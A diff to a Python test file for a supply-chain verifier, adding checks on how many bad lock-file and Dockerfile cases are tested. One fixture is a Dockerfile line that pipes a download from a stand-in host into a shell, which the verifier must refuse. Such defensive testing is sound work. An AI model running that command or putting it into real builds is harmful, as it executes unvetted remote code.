@@ -64,6 +64,7 @@ def test_a_lock_that_is_not_exact_pinned_and_hashed_is_refused():
         "option line": "--index-url https://example.invalid/simple\n" + GOOD_LOCK,
         "lists no distributions": "# empty\n",
     }
+    assert len(cases) == 6
     for want, lock in cases.items():
         v = SC.verify(lock_text=lock, reqs_text=GOOD_REQS, docker_text=GOOD_DOCKER)
         assert v["ok"] is False and any(want in p for p in v["problems"]), (want, v["problems"])
@@ -77,6 +78,7 @@ def test_an_install_path_that_bypasses_the_hash_checked_lock_is_refused():
         "pipes a download": GOOD_DOCKER + "RUN curl -sSL https://example.invalid/x | sh\n",
         "does not install requirements.lock": "FROM python:3.11-slim\nCOPY requirements.lock ./\n",
     }
+    assert len(cases) == 5
     for want, docker in cases.items():
         v = SC.verify(lock_text=GOOD_LOCK, reqs_text=GOOD_REQS, docker_text=docker)
         assert v["ok"] is False and any(want in p for p in v["problems"]), (want, v["problems"])
